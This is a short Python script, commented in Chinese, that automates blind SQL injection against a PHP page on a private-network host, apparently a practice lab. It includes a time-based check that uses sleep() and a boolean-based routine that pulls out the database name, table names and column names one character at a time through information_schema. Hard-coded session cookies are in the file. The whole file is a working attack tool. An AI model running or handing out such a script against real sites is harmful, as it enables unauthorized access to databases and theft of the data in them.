import requests, time

# 时间型盲注
def time_blind():
    for len in range(1, 50):
        start = time.time()
        header = {"Cookie":"PHPSESSID=jbn47m13m6qbs4b5lq7ljp6nu0"}
        url = f"http://192.168.112.188/security/read.php?id=1 and if(length(database())={len}, sleep(3.5), 1)"
        resp = requests.get(url=url, headers=header)
        end = time.time()
        resptime = end-start
        if int(resptime) >= 3:
            print(len)
            break

# 布尔型盲注爆列名
def bool_blind():
    chars = "abcdefghijklmnopqrstuvwxyz0123456789_,"
    session = requests.session()
    base_url = "http://192.168.112.188/security/read.php?id=1"
    header = {"Cookie":"PHPSESSID=usuvu24vgl3sh4mci1tll8uri0"}

    # 先定义猜对的时候的长度
    resp = session.get(url=base_url + " and 1=1", headers=header)
    base_len = len(resp.text)

    # 先获取数据库长度
    for db_len in range(1, 20):
        url = f"{base_url} and length(database())={db_len}"
        resp = session.get(url=url, headers=header)
        if len(resp.text) == base_len:
            break

    print(f"数据库长度为：{db_len}")

    # 根据数据库长度猜名称
    db_name = ''
    for i in range(1, db_len+1):
        for c in chars:
            url = f"{base_url} and substr(database(), {i}, 1)='{c}'"
            resp = session.get(url=url, headers=header)
            if len(resp.text) == base_len:
                db_name += c
                break

    print(f"数据库名称为：{db_name}")

    # 根据数据库名称猜表名
    table_name = ''
    for i in range(1, 40):
        for c in chars:
            sql = f"select group_concat(table_name) from information_schema.tables where table_schema='{db_name}'"
            url = f"{base_url} and substr(({sql}), {i}, 1)='{c}'"
            resp = session.get(url=url, headers=header)
            if len(resp.text) == base_len:
                table_name += c
                break

    print(f"数据库中表的名称为：{table_name}")

    # 猜所有表的列名
    table_list = table_name.strip().split(',')
    for table in table_list:
        column_name = ''
        for i in range(100):
            for c in chars:
                sql = f"select group_concat(column_name) from information_schema.columns where table_schema='{db_name}' and table_name='{table}'"
                url = f"{base_url} and substr(({sql}), {i}, 1)='{c}'"
                resp = session.get(url=url, headers=header)
                if len(resp.text) == base_len:
                    column_name += c
                    break
        print(f"表{table}的列名为：{column_name}")



if __name__ == '__main__':
    # time_blind()
    bool_blind()